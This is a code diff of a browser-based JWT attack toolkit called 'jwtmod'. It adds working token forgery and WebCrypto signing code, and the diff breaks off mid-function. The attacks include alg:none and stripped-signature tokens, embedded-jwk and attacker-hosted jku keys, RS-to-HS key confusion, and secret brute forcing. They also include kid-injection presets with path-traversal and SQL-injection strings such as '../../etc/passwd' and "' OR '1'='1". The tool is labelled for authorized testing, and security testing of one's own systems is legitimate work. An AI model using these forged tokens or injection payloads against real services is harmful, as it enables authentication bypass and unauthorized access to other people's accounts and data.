@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>jwt-none forger</title>
+  <title>jwtmod — JWT security testing toolkit</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     :root {
@@ -22,151 +22,109 @@
     body {
       margin: 0;
       font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      line-height: 1.45;
+      background: var(--bg); color: var(--text); line-height: 1.45;
     }
     header {
-      padding: 20px 28px;
-      border-bottom: 1px solid var(--border);
-      display: flex;
-      align-items: baseline;
-      gap: 16px;
-      flex-wrap: wrap;
+      padding: 18px 28px; border-bottom: 1px solid var(--border);
+      display: flex; align-items: baseline; gap: 16px; flex-wrap: wrap;
     }
-    header h1 {
-      margin: 0;
-      font-size: 18px;
-      letter-spacing: 0.5px;
-    }
+    header h1 { margin: 0; font-size: 18px; letter-spacing: 0.5px; }
     header .tag {
-      font-size: 12px;
-      color: var(--warn);
-      border: 1px solid var(--warn);
-      padding: 2px 8px;
-      border-radius: 999px;
+      font-size: 12px; color: var(--warn);
+      border: 1px solid var(--warn); padding: 2px 8px; border-radius: 999px;
     }
-    main {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      padding: 16px 28px 32px;
+    main { padding: 16px 28px 32px; display: grid; gap: 16px; }
+    .top-grid {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
     }
     .panel {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 14px 16px;
-      display: flex;
-      flex-direction: column;
-      min-height: 220px;
+      background: var(--panel); border: 1px solid var(--border);
+      border-radius: 10px; padding: 14px 16px;
+      display: flex; flex-direction: column;
     }
     .panel.full { grid-column: 1 / -1; }
     .panel h2 {
-      margin: 0 0 8px;
-      font-size: 13px;
-      text-transform: uppercase;
-      letter-spacing: 0.6px;
-      color: var(--muted);
+      margin: 0 0 8px; font-size: 13px; text-transform: uppercase;
+      letter-spacing: 0.6px; color: var(--muted);
     }
-    textarea, input[type=text] {
-      width: 100%;
-      background: var(--panel-2);
-      color: var(--text);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 10px 12px;
-      font-family: var(--mono);
-      font-size: 13px;
+    textarea, input[type=text], select {
+      width: 100%; background: var(--panel-2); color: var(--text);
+      border: 1px solid var(--border); border-radius: 8px;
+      padding: 9px 11px; font-family: var(--mono); font-size: 13px;
       resize: vertical;
     }
-    textarea { min-height: 130px; }
-    .row {
-      display: flex;
-      gap: 8px;
-      align-items: center;
-      flex-wrap: wrap;
-      margin-top: 10px;
-    }
+    textarea { min-height: 110px; }
+    textarea.short { min-height: 70px; }
+    .row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-top: 10px; }
+    .row.cols { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
     button {
-      background: var(--accent);
-      color: #0b0f17;
-      border: 0;
-      border-radius: 8px;
-      padding: 8px 14px;
-      font-weight: 600;
-      cursor: pointer;
-      font-size: 13px;
+      background: var(--accent); color: #0b0f17; border: 0;
+      border-radius: 8px; padding: 7px 12px; font-weight: 600;
+      cursor: pointer; font-size: 13px;
     }
     button.secondary {
-      background: transparent;
-      color: var(--accent);
-      border: 1px solid var(--accent);
+      background: transparent; color: var(--accent); border: 1px solid var(--accent);
     }
     button.go { background: var(--accent-2); }
+    button.danger { background: var(--danger); color: #1a0a0f; }
     button:disabled { opacity: 0.5; cursor: not-allowed; }
     label.check {
-      font-size: 12px;
-      color: var(--muted);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
+      font-size: 12px; color: var(--muted);
+      display: inline-flex; align-items: center; gap: 6px;
     }
     pre.out {
-      background: var(--panel-2);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 10px 12px;
-      font-family: var(--mono);
-      font-size: 13px;
-      white-space: pre-wrap;
-      word-break: break-all;
-      margin: 0;
-      min-height: 60px;
+      background: var(--panel-2); border: 1px solid var(--border);
+      border-radius: 8px; padding: 10px 12px;
+      font-family: var(--mono); font-size: 12.5px;
+      white-space: pre-wrap; word-break: break-all; margin: 0; min-height: 40px;
     }
     .err {
-      color: var(--danger);
-      font-family: var(--mono);
-      font-size: 12px;
-      margin-top: 8px;
-      white-space: pre-wrap;
+      color: var(--danger); font-family: var(--mono); font-size: 12px;
+      margin-top: 8px; white-space: pre-wrap;
     }
     .muted { color: var(--muted); font-size: 12px; }
-    .removes-list {
-      display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px;
-    }
+    .removes-list { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
     .chip {
-      background: var(--panel-2);
-      border: 1px solid var(--border);
-      border-radius: 999px;
-      padding: 4px 10px;
-      font-family: var(--mono);
-      font-size: 12px;
-      display: inline-flex;
-      gap: 6px;
-      align-items: center;
+      background: var(--panel-2); border: 1px solid var(--border);
+      border-radius: 999px; padding: 4px 10px; font-family: var(--mono);
+      font-size: 12px; display: inline-flex; gap: 6px; align-items: center;
     }
     .chip button {
-      background: transparent;
-      color: var(--danger);
-      padding: 0;
-      font-size: 14px;
-      line-height: 1;
+      background: transparent; color: var(--danger); padding: 0;
+      font-size: 14px; line-height: 1;
     }
-    footer {
-      padding: 0 28px 24px;
-      color: var(--muted);
-      font-size: 12px;
+    .tabs {
+      display: flex; flex-wrap: wrap; gap: 6px;
+      border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 12px;
     }
-    @media (max-width: 880px) {
-      main { grid-template-columns: 1fr; }
+    .tab {
+      background: transparent; color: var(--muted);
+      border: 1px solid var(--border); border-radius: 999px;
+      padding: 5px 12px; font-size: 12px; cursor: pointer;
+    }
+    .tab.active { background: var(--accent); color: #0b0f17; border-color: var(--accent); }
+    .pane { display: none; }
+    .pane.active { display: block; }
+    .badge {
+      display: inline-block; padding: 2px 8px; border-radius: 999px;
+      font-size: 11px; font-weight: 600;
+    }
+    .badge.ok { background: rgba(158, 206, 106, 0.15); color: var(--accent-2); border: 1px solid var(--accent-2); }
+    .badge.bad { background: rgba(247, 118, 142, 0.15); color: var(--danger); border: 1px solid var(--danger); }
+    .badge.warn { background: rgba(224, 175, 104, 0.15); color: var(--warn); border: 1px solid var(--warn); }
+    .warnings { margin: 4px 0 0; padding-left: 18px; }
+    .warnings li { color: var(--warn); font-size: 12.5px; }
+    footer { padding: 0 28px 24px; color: var(--muted); font-size: 12px; }
+    @media (max-width: 900px) {
+      .top-grid, .row.cols { grid-template-columns: 1fr; }
     }
   </style>
 </head>
 <body>
   <header>
-    <h1>jwt-none forger</h1>
+    <h1>jwtmod</h1>
     <span class="tag">authorized testing only</span>
+    <span class="muted">runs entirely in your browser via WebCrypto</span>
   </header>
 
   <main>
@@ -175,34 +133,212 @@
       <textarea id="input-token" placeholder="paste a JWT (header.payload.signature) — decoded live as you type"></textarea>
       <div class="row">
         <span class="muted" id="decode-status">awaiting input</span>
-        <button class="secondary" id="btn-reset-payload" title="Re-populate the editable payload from the input token">Reset payload</button>
+        <button class="secondary" id="btn-reset-payload" title="Re-populate the editable payload from the input">Reset payload</button>
       </div>
       <div class="err" id="decode-err"></div>
     </section>
 
-    <section class="panel">
-      <h2>Decoded header (read-only)</h2>
-      <pre class="out" id="header-view">—</pre>
-    </section>
-
-    <section class="panel">
-      <h2>Editable payload (JSON)</h2>
-      <textarea id="payload-edit" placeholder='{ "sub": "alice", "role": "user" }'></textarea>
-      <div class="row">
-        <input type="text" id="remove-input" placeholder="claim to remove (e.g. exp)" style="flex:1; min-width: 180px;" />
-        <button class="secondary" id="btn-add-remove">Add remove</button>
+    <section class="top-grid">
+      <div class="panel">
+        <h2>Decoded header (read-only)</h2>
+        <pre class="out" id="header-view">—</pre>
       </div>
-      <div class="removes-list" id="removes-list"></div>
+      <div class="panel">
+        <h2>Editable payload (JSON)</h2>
+        <textarea id="payload-edit" placeholder='{ "sub": "alice", "role": "user" }'></textarea>
+        <div class="row">
+          <input type="text" id="remove-input" placeholder="claim to remove (e.g. exp)" style="flex:1; min-width: 180px;" />
+          <button class="secondary" id="btn-add-remove">Add remove</button>
+        </div>
+        <div class="removes-list" id="removes-list"></div>
+      </div>
     </section>
 
     <section class="panel full">
-      <h2>Options</h2>
-      <div class="row">
-        <label class="check"><input type="checkbox" id="opt-keep-header" /> keep header extras (kid, etc.)</label>
-        <label class="check"><input type="checkbox" id="opt-trailing-dot" checked /> trailing dot ("h.p.")</label>
-        <span class="muted" id="forge-status">awaiting input</span>
+      <h2>Attacks</h2>
+      <div class="tabs" id="tabs">
+        <button class="tab active" data-tab="none">alg:none</button>
+        <button class="tab" data-tab="sign">Sign as</button>
+        <button class="tab" data-tab="jwk">Embed jwk</button>
+        <button class="tab" data-tab="jku">jku</button>
+        <button class="tab" data-tab="kid">kid injection</button>
+        <button class="tab" data-tab="rs2hs">RS→HS confusion</button>
+        <button class="tab" data-tab="strip">Strip signature</button>
+        <button class="tab" data-tab="verify">Verify</button>
+        <button class="tab" data-tab="brute">Brute</button>
+        <button class="tab" data-tab="diff">Diff</button>
+        <button class="tab" data-tab="info">Info</button>
       </div>
-      <div class="err" id="forge-err"></div>
+
+      <!-- alg:none -->
+      <div class="pane active" data-pane="none">
+        <div class="row">
+          <label class="check"><input type="checkbox" id="none-keep" /> keep header extras</label>
+          <label class="check"><input type="checkbox" id="none-trailing" checked /> trailing dot</label>
+          <label class="check">alg literal:
+            <select id="none-alg-literal">
+              <option>none</option><option>None</option><option>NONE</option><option>nOnE</option>
+            </select>
+          </label>
+        </div>
+        <p class="muted">Catches verifiers that accept <code>alg=none</code> (RFC mistake) or fail to canonicalize the alg string.</p>
+      </div>
+
+      <!-- Sign as -->
+      <div class="pane" data-pane="sign">
+        <div class="row cols">
+          <label class="muted">alg
+            <select id="sign-alg">
+              <option>HS256</option><option>HS384</option><option>HS512</option>
+              <option>RS256</option><option>RS384</option><option>RS512</option>
+              <option>PS256</option><option>PS384</option><option>PS512</option>
+              <option>ES256</option><option>ES384</option><option>ES512</option>
+            </select>
+          </label>
+          <label class="muted">kid (optional)
+            <input type="text" id="sign-kid" />
+          </label>
+        </div>
+        <textarea id="sign-key" class="short" placeholder="HS*: secret string. RS/PS/ES: PKCS#8 PEM private key."></textarea>
+        <p class="muted">Real signing via WebCrypto. Catches verifiers that accept attacker-chosen algorithms.</p>
+      </div>
+
+      <!-- Embed jwk -->
+      <div class="pane" data-pane="jwk">
+        <div class="row">
+          <label class="muted">alg
+            <select id="jwk-alg">
+              <option>RS256</option><option>RS384</option><option>RS512</option>
+              <option>PS256</option><option>PS384</option><option>PS512</option>
+              <option>ES256</option><option>ES384</option><option>ES512</option>
+            </select>
+          </label>
+          <button id="jwk-gen" class="go">Generate key &amp; sign</button>
+          <span class="muted" id="jwk-status"></span>
+        </div>
+        <pre class="out" id="jwk-pem">—</pre>
+        <p class="muted">Catches verifiers that <em>trust the JWK embedded in the header itself</em>.</p>
+      </div>
+
+      <!-- jku -->
+      <div class="pane" data-pane="jku">
+        <div class="row cols">
+          <label class="muted">jku URL
+            <input type="text" id="jku-url" placeholder="https://attacker.tld/.well-known/jwks.json" />
+          </label>
+          <label class="muted">alg
+            <select id="jku-alg">
+              <option>RS256</option><option>RS384</option><option>RS512</option>
+              <option>ES256</option><option>ES384</option><option>ES512</option>
+            </select>
+          </label>
+        </div>
+        <div class="row">
+          <button id="jku-gen" class="go">Generate &amp; sign</button>
+          <span class="muted" id="jku-status"></span>
+        </div>
+        <h2 style="margin-top:14px;">JWKS to host at the jku URL</h2>
+        <pre class="out" id="jku-jwks">—</pre>
+        <p class="muted">Catches verifiers that fetch any URL in <code>jku</code> instead of an allowlist.</p>
+      </div>
+
+      <!-- kid -->
+      <div class="pane" data-pane="kid">
+        <div class="row cols">
+          <label class="muted">kid value
+            <input type="text" id="kid-value" placeholder="../../../../dev/null" />
+          </label>
+          <label class="muted">canned payload
+            <select id="kid-preset">
+              <option value="">(custom)</option>
+              <option>../../../../dev/null</option>
+              <option>/dev/null</option>
+              <option>../../../../../../etc/passwd</option>
+              <option>' UNION SELECT 'x'--</option>
+              <option>' OR '1'='1</option>
+            </select>
+          </label>
+        </div>
+        <div class="row cols">
+          <label class="muted">HS secret (default empty)
+            <input type="text" id="kid-secret" placeholder="" />
+          </label>
+          <label class="muted">alg
+            <select id="kid-alg">
+              <option>HS256</option><option>HS384</option><option>HS512</option>
+            </select>
+          </label>
+        </div>
+        <p class="muted">Catches verifiers that read the file at <code>kid</code> and HMAC with its contents — empty file → empty key.</p>
+      </div>
+
+      <!-- RS->HS -->
+      <div class="pane" data-pane="rs2hs">
+        <textarea id="rs2hs-pem" class="short" placeholder="-----BEGIN PUBLIC KEY-----&#10;...&#10;-----END PUBLIC KEY-----"></textarea>
+        <div class="row">
+          <label class="muted">HS alg
+            <select id="rs2hs-alg">
+              <option>HS256</option><option>HS384</option><option>HS512</option>
+            </select>
+          </label>
+          <span class="muted">Generates two variants (raw + normalized PEM).</span>
+        </div>
+        <h2 style="margin-top:14px;">Normalized-PEM variant</h2>
+        <pre class="out" id="rs2hs-alt">—</pre>
+        <p class="muted">Catches verifiers that accept HS* when the issuer signs RS*, reusing the public PEM as the HMAC secret.</p>
+      </div>
+
+      <!-- Strip -->
+      <div class="pane" data-pane="strip">
+        <div class="row">
+          <label class="muted">alg literal (optional)
+            <input type="text" id="strip-alg" placeholder="(unchanged)" />
+          </label>
+          <label class="check"><input type="checkbox" id="strip-trailing" /> trailing dot</label>
+        </div>
+        <p class="muted">Catches verifiers that skip signature checks when the third segment is empty.</p>
+      </div>
+
+      <!-- Verify -->
+      <div class="pane" data-pane="verify">
+        <div class="row cols">
+          <label class="muted">alg
+            <select id="verify-alg">
+              <option>HS256</option><option>HS384</option><option>HS512</option>
+              <option>RS256</option><option>RS384</option><option>RS512</option>
+              <option>PS256</option><option>PS384</option><option>PS512</option>
+              <option>ES256</option><option>ES384</option><option>ES512</option>
+              <option>none</option>
+            </select>
+          </label>
+          <span id="verify-badge" class="badge warn">awaiting input</span>
+        </div>
+        <textarea id="verify-key" class="short" placeholder="HS*: secret. RS/PS/ES: PEM public key."></textarea>
+        <p class="muted">Local-only check of the input token.</p>
+      </div>
+
+      <!-- Brute -->
+      <div class="pane" data-pane="brute">
+        <textarea id="brute-wordlist" class="short" placeholder="one secret per line (blank = use the bundled top list)"></textarea>
+        <div class="row">
+          <button id="brute-go" class="go">Run brute force</button>
+          <span class="muted" id="brute-status"></span>
+        </div>
+        <p class="muted">HS* only. Runs locally in your browser; bundled wordlist is fetched from <code>/wordlist</code> when the textarea is empty.</p>
+      </div>
+
+      <!-- Diff -->
+      <div class="pane" data-pane="diff">
+        <textarea id="diff-other" class="short" placeholder="second token to compare against the input"></textarea>
+        <pre class="out" id="diff-out">—</pre>
+      </div>
+
+      <!-- Info -->
+      <div class="pane" data-pane="info">
+        <pre class="out" id="info-out">—</pre>
+      </div>
+
+      <div class="err" id="attack-err"></div>
     </section>
 
     <section class="panel full">
@@ -218,201 +354,639 @@
   </main>
 
   <footer>
-    Local helper for the classic <code>alg: none</code> JWT acceptance flaw. Never deploy this.
+    jwtmod runs entirely in your browser. Server endpoints under <code>/api/</code> exist for scripting parity.
   </footer>
 
   <script>
-    const $ = (id) => document.getElementById(id);
-    const state = { removes: [], lastDecodedToken: null };
+  /* eslint-disable no-undef */
+  const $ = (id) => document.getElementById(id);
+  const state = {
+    removes: [],
+    lastDecodedToken: null,
+    lastHeader: null,
+    lastPayload: null,
+    tab: "none",
+    generated: { jwk: null, jku: null },  // { privateKey, publicKey, jwk, alg, pem }
+  };
 
-    function b64urlEncodeFromString(str) {
-      const bytes = new TextEncoder().encode(str);
-      let bin = "";
-      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
-      return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+  /* ---- base64url / encoding helpers ---- */
+  const te = new TextEncoder(), td = new TextDecoder();
+  function b64urlFromBytes(bytes) {
+    let bin = "";
+    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+  }
+  function bytesFromB64url(seg) {
+    let s = seg.replace(/-/g, "+").replace(/_/g, "/");
+    while (s.length % 4) s += "=";
+    const bin = atob(s);
+    const out = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+    return out;
+  }
+  function b64urlString(s) { return b64urlFromBytes(te.encode(s)); }
+  function jsonSeg(obj) { return b64urlString(JSON.stringify(obj)); }
+
+  /* ---- decode ---- */
+  function decodeJwt(token) {
+    const parts = token.split(".");
+    if (parts.length < 2 || parts.length > 3) {
+      throw new Error(`expected 2 or 3 dot-separated segments, got ${parts.length}`);
     }
-
-    function b64urlDecodeToString(seg) {
-      let s = seg.replace(/-/g, "+").replace(/_/g, "/");
-      while (s.length % 4) s += "=";
-      const bin = atob(s);
-      const bytes = new Uint8Array(bin.length);
-      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-      return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
+    const [h, p, s = ""] = parts;
+    let header, payload;
+    try { header = JSON.parse(td.decode(bytesFromB64url(h))); }
+    catch { throw new Error("header is not valid base64url JSON"); }
+    try { payload = JSON.parse(td.decode(bytesFromB64url(p))); }
+    catch { throw new Error("payload is not valid base64url JSON"); }
+    if (typeof header !== "object" || header === null || Array.isArray(header)) {
+      throw new Error("header must decode to a JSON object");
     }
-
-    function decodeClientSide(token) {
-      const parts = token.split(".");
-      if (parts.length < 2 || parts.length > 3) {
-        throw new Error(`expected 2 or 3 dot-separated segments, got ${parts.length}`);
-      }
-      const [h, p, s = ""] = parts;
-      let header, payload;
-      try { header = JSON.parse(b64urlDecodeToString(h)); }
-      catch (e) { throw new Error("header is not valid base64url JSON"); }
-      try { payload = JSON.parse(b64urlDecodeToString(p)); }
-      catch (e) { throw new Error("payload is not valid base64url JSON"); }
-      if (typeof header !== "object" || header === null || Array.isArray(header)) {
-        throw new Error("header must decode to a JSON object");
-      }
-      if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
-        throw new Error("payload must decode to a JSON object");
-      }
-      return { header, payload, signature: s };
+    if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
+      throw new Error("payload must decode to a JSON object");
     }
+    return { header, payload, signature: s };
+  }
 
-    function debounce(fn, ms) {
-      let t;
-      return (...args) => {
-        clearTimeout(t);
-        t = setTimeout(() => fn(...args), ms);
-      };
+  function debounce(fn, ms) {
+    let t;
+    return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
+  }
+
+  /* ---- WebCrypto: import keys + sign ---- */
+  const HASH_OF = { 256: "SHA-256", 384: "SHA-384", 512: "SHA-512" };
+
+  function pemToDer(pem) {
+    const stripped = pem.replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
+    if (!stripped) throw new Error("PEM is empty");
+    return bytesFromB64url(stripped.replace(/\+/g, "-").replace(/\//g, "_"));
+  }
+
+  async function importHsKey(secret, alg) {
+    const bits = alg.slice(2);
+    return crypto.subtle.importKey(
+      "raw",
+      typeof secret === "string" ? te.encode(secret) : secret,
+      { name: "HMAC", hash: HASH_OF[bits] },
+      false, ["sign", "verify"]
+    );
+  }
+
+  async function importRsaPkcs8(pem, alg) {
+    const der = pemToDer(pem);
+    const bits = alg.slice(2);
+    const params = alg.startsWith("PS")
+      ? { name: "RSA-PSS", hash: HASH_OF[bits] }
+      : { name: "RSASSA-PKCS1-v1_5", hash: HASH_OF[bits] };
+    return crypto.subtle.importKey("pkcs8", der, params, true, ["sign"]);
+  }
+
+  async function importRsaSpki(pem, alg) {
+    const der = pemToDer(pem);
+    const bits = alg.slice(2);
+    const params = alg.startsWith("PS")
+      ? { name: "RSA-PSS", hash: HASH_OF[bits] }
+      : { name: "RSASSA-PKCS1-v1_5", hash: HASH_OF[bits] };
+    return crypto.subtle.importKey("spki", der, params, true, ["verify"]);
+  }
+
+  const EC_CURVE = { ES256: "P-256", ES384: "P-384", ES512: "P-521" };
+  const EC_LEN = { ES256: 32, ES384: 48, ES512: 66 };
+
+  async function importEcPkcs8(pem, alg) {
+    const der = pemToDer(pem);
+    return crypto.subtle.importKey(
+      "pkcs8", der,
+      { name: "ECDSA", namedCurve: EC_CURVE[alg] },
+      true, ["sign"]
+    );
+  }
+  async function importEcSpki(pem, alg) {
+    const der = pemToDer(pem);
+    return crypto.subtle.importKey(
+      "spki", der,
+      { name: "ECDSA", namedCurve: EC_CURVE[alg] },
+      true, ["verify"]
+    );
+  }
+
+  async function signJwt(header, payload, alg, keyMaterial) {
+    if (alg === "none") {
+      return `${jsonSeg(header)}.${jsonSeg(payload)}.`;
     }
+    const h = { ...header, alg };
+    if (!("typ" in h)) h.typ = "JWT";
+    const si = `${jsonSeg(h)}.${jsonSeg(payload)}`;
+    const data = te.encode(si);
+    let cryptoKey, params;
+    const bits = alg.slice(2);
+    if (alg.startsWith("HS")) {
+      cryptoKey = await importHsKey(keyMaterial, alg);
+      params = { name: "HMAC" };
+    } else if (alg.startsWith("RS")) {
+      cryptoKey = keyMaterial.type === "private" ? keyMaterial : await importRsaPkcs8(keyMaterial, alg);
+      params = { name: "RSASSA-PKCS1-v1_5" };
+    } else if (alg.startsWith("PS")) {
+      cryptoKey = keyMaterial.type === "private" ? keyMaterial : await importRsaPkcs8(keyMaterial, alg);
+      params = { name: "RSA-PSS", saltLength: parseInt(bits) / 8 };
+    } else if (alg.startsWith("ES")) {
+      cryptoKey = keyMaterial.type === "private" ? keyMaterial : await importEcPkcs8(keyMaterial, alg);
+      params = { name: "ECDSA", hash: HASH_OF[bits] };
+    } else {
+      throw new Error(`unsupported alg: ${alg}`);
+    }
+    const sig = new Uint8Array(await crypto.subtle.sign(params, cryptoKey, data));
+    return `${si}.${b64urlFromBytes(sig)}`;
+  }
 
-    function forgeClientSide({ header, payload, removes, keepHeaderExtras, trailingDot }) {
-      const newPayload = JSON.parse(JSON.stringify(payload));
-      for (const k of removes || []) delete newPayload[k];
-      let newHeader;
-      if (keepHeaderExtras && header && typeof header === "object") {
-        newHeader = { alg: "none" };
-        for (const [k, v] of Object.entries(header)) {
-          if (k !== "alg") newHeader[k] = v;
-        }
-        if (newHeader.typ === undefined) newHeader.typ = "JWT";
+  async function verifyJwt(token, alg, keyMaterial) {
+    const parts = token.split(".");
+    if (parts.length < 2 || parts.length > 3) return false;
+    const [h, p, s = ""] = parts;
+    if (alg === "none") return s === "";
+    if (!s) return false;
+    const sig = bytesFromB64url(s);
+    const data = te.encode(`${h}.${p}`);
+    const bits = alg.slice(2);
+    let cryptoKey, params;
+    try {
+      if (alg.startsWith("HS")) {
+        cryptoKey = await importHsKey(keyMaterial, alg);
+        params = { name: "HMAC" };
+      } else if (alg.startsWith("RS")) {
+        cryptoKey = await importRsaSpki(keyMaterial, alg);
+        params = { name: "RSASSA-PKCS1-v1_5" };
+      } else if (alg.startsWith("PS")) {
+        cryptoKey = await importRsaSpki(keyMaterial, alg);
+        params = { name: "RSA-PSS", saltLength: parseInt(bits) / 8 };
+      } else if (alg.startsWith("ES")) {
+        cryptoKey = await importEcSpki(keyMaterial, alg);
+        params = { name: "ECDSA", hash: HASH_OF[bits] };
       } else {
-        newHeader = { alg: "none", typ: "JWT" };
+        return false;
       }
-      const h = b64urlEncodeFromString(JSON.stringify(newHeader));
-      const p = b64urlEncodeFromString(JSON.stringify(newPayload));
-      const token = trailingDot ? `${h}.${p}.` : `${h}.${p}`;
-      return { header: newHeader, payload: newPayload, token };
+    } catch (e) {
+      throw new Error(`key import failed: ${e.message}`);
     }
+    return crypto.subtle.verify(params, cryptoKey, sig, data);
+  }
 
-    function applyDecoded(token, opts = { force: false }) {
-      const trimmed = token.trim();
-      const statusEl = $("decode-status");
-      const errEl = $("decode-err");
-      errEl.textContent = "";
-      if (!trimmed) {
-        $("header-view").textContent = "—";
-        state.lastHeader = null;
-        if (opts.force) $("payload-edit").value = "";
-        statusEl.textContent = "awaiting input";
-        state.lastDecodedToken = null;
-        runForge();
-        return;
-      }
-      let decoded;
-      try { decoded = decodeClientSide(trimmed); }
-      catch (e) {
-        statusEl.textContent = "invalid token";
-        errEl.textContent = e.message;
-        state.lastHeader = null;
-        runForge();
-        return;
-      }
-      $("header-view").textContent = JSON.stringify(decoded.header, null, 2);
-      state.lastHeader = decoded.header;
-      if (opts.force || state.lastDecodedToken !== trimmed) {
-        $("payload-edit").value = JSON.stringify(decoded.payload, null, 2);
-      }
-      state.lastDecodedToken = trimmed;
-      statusEl.textContent = "decoded";
-      runForge();
+  /* ---- JWK helpers + thumbprint ---- */
+  async function thumbprint(jwk) {
+    let canon;
+    if (jwk.kty === "RSA") canon = { e: jwk.e, kty: "RSA", n: jwk.n };
+    else if (jwk.kty === "EC") canon = { crv: jwk.crv, kty: "EC", x: jwk.x, y: jwk.y };
+    else throw new Error("unsupported kty");
+    const data = te.encode(JSON.stringify(canon));
+    const hash = new Uint8Array(await crypto.subtle.digest("SHA-256", data));
+    return b64urlFromBytes(hash);
+  }
+
+  async function generateKeypair(alg) {
+    const bits = alg.slice(2);
+    let params, usages;
+    if (alg.startsWith("RS")) {
+      params = { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048,
+                 publicExponent: new Uint8Array([1,0,1]), hash: HASH_OF[bits] };
+      usages = ["sign", "verify"];
+    } else if (alg.startsWith("PS")) {
+      params = { name: "RSA-PSS", modulusLength: 2048,
+                 publicExponent: new Uint8Array([1,0,1]), hash: HASH_OF[bits] };
+      usages = ["sign", "verify"];
+    } else if (alg.startsWith("ES")) {
+      params = { name: "ECDSA", namedCurve: EC_CURVE[alg] };
+      usages = ["sign", "verify"];
+    } else {
+      throw new Error(`cannot generate keypair for ${alg}`);
     }
+    const kp = await crypto.subtle.generateKey(params, true, usages);
+    const pubJwk = await crypto.subtle.exportKey("jwk", kp.publicKey);
+    const cleanJwk = alg.startsWith("ES")
+      ? { kty: pubJwk.kty, crv: pubJwk.crv, x: pubJwk.x, y: pubJwk.y }
+      : { kty: pubJwk.kty, n: pubJwk.n, e: pubJwk.e };
+    cleanJwk.kid = await thumbprint(cleanJwk);
+    const pkcs8 = new Uint8Array(await crypto.subtle.exportKey("pkcs8", kp.privateKey));
+    const pem = derToPem(pkcs8, "PRIVATE KEY");
+    return { privateKey: kp.privateKey, publicKey: kp.publicKey, jwk: cleanJwk, alg, pem };
+  }
 
-    function runForge() {
-      const statusEl = $("forge-status");
-      const errEl = $("forge-err");
-      errEl.textContent = "";
-      const header = state.lastHeader;
-      const raw = $("payload-edit").value.trim();
-      if (!header || !raw) {
-        $("output-token").textContent = "—";
-        $("output-detail").textContent = "—";
-        statusEl.textContent = "awaiting input";
-        return;
-      }
-      let payload;
-      try { payload = JSON.parse(raw); }
-      catch (e) {
-        statusEl.textContent = "payload JSON invalid";
-        errEl.textContent = e.message;
-        return;
-      }
-      if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
-        statusEl.textContent = "payload JSON invalid";
-        errEl.textContent = "payload must be a JSON object";
-        return;
-      }
-      const forged = forgeClientSide({
-        header,
-        payload,
-        removes: state.removes,
-        keepHeaderExtras: $("opt-keep-header").checked,
-        trailingDot: $("opt-trailing-dot").checked,
-      });
-      $("output-token").textContent = forged.token;
-      $("output-detail").textContent = JSON.stringify(
-        { header: forged.header, payload: forged.payload }, null, 2
-      );
-      statusEl.textContent = "forged";
+  function derToPem(bytes, label) {
+    const b64 = btoa(String.fromCharCode(...bytes));
+    const wrapped = b64.match(/.{1,64}/g).join("\n");
+    return `-----BEGIN ${label}-----\n${wrapped}\n-----END ${label}-----\n`;
+  }
+
+  /* ---- common: build edited payload from UI ---- */
+  function currentPayload() {
+    const raw = $("payload-edit").value.trim();
+    if (!raw) throw new Error("payload is empty");
+    let obj;
+    try { obj = JSON.parse(raw); } catch (e) { throw new Error(`payload JSON: ${e.message}`); }
+    if (typeof obj !== "object" || obj === null || Array.isArray(obj)) {
+      throw new Error("payload must be a JSON object");
     }
+    for (const k of state.removes) delete obj[k];
+    return obj;
+  }
 
-    function renderRemoves() {
-      const el = $("removes-list");
-      el.innerHTML = "";
-      state.removes.forEach((k, i) => {
-        const c = document.createElement("span");
-        c.className = "chip";
-        c.textContent = k;
-        const b = document.createElement("button");
-        b.textContent = "x";
-        b.title = "remove";
-        b.onclick = () => { state.removes.splice(i, 1); renderRemoves(); runForge(); };
-        c.appendChild(b);
-        el.appendChild(c);
-      });
+  /* ---- output panel ---- */
+  function setOutput(token, header, payload, extra) {
+    $("output-token").textContent = token || "—";
+    const detail = { header, payload };
+    if (extra && Object.keys(extra).length) detail.extra = extra;
+    $("output-detail").textContent = (header && payload)
+      ? JSON.stringify(detail, null, 2) : "—";
+  }
+
+  /* ---- input decode + tab dispatcher ---- */
+  function applyDecoded(token, opts = { force: false }) {
+    const trimmed = token.trim();
+    const statusEl = $("decode-status"), errEl = $("decode-err");
+    errEl.textContent = "";
+    if (!trimmed) {
+      $("header-view").textContent = "—";
+      state.lastHeader = null; state.lastPayload = null;
+      if (opts.force) $("payload-edit").value = "";
+      statusEl.textContent = "awaiting input";
+      state.lastDecodedToken = null;
+      runActive();
+      return;
     }
+    let decoded;
+    try { decoded = decodeJwt(trimmed); }
+    catch (e) {
+      statusEl.textContent = "invalid token"; errEl.textContent = e.message;
+      state.lastHeader = null; runActive(); return;
+    }
+    $("header-view").textContent = JSON.stringify(decoded.header, null, 2);
+    state.lastHeader = decoded.header;
+    state.lastPayload = decoded.payload;
